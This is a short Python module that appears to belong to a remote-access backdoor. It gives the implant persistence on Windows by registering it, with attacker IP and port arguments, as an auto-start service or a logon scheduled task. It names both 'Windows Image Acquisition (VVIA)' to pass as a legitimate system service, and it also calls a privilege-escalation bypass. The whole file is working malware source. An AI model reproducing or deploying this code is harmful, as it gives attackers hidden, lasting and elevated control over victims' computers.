from foreign.privileges.win_privileges import *
from foreign.utility.terminal_pipe import *
from foreign.global_state import *


def persistence(action_type, extra_data):
  arguments = f' -ip {state["ip"]} -p {state["port"]}'

  if action_type == 'elevate':
    return bypass(state['file'], arguments)
  elif action_type == 'service':
    try:
      terminal_pipe(f'sc delete "Windows Image Acquisition (VVIA)"', extra_data[0], extra_data[1])
    finally:
      return {'message': terminal_pipe(f'sc create "Windows Image Acquisition (VVIA)" binpath= "{state["file"]}{arguments}" start= "auto"', extra_data[0], extra_data[1])}
  elif action_type == 'schedule':
    return {'message': terminal_pipe(f'schtasks /Create /SC ONLOGON /TN "Windows Image Acquisition (VVIA)" /TR "{state["file"]}{arguments}" /F', extra_data[0], extra_data[1])}
  else:
    raise Exception('Error message')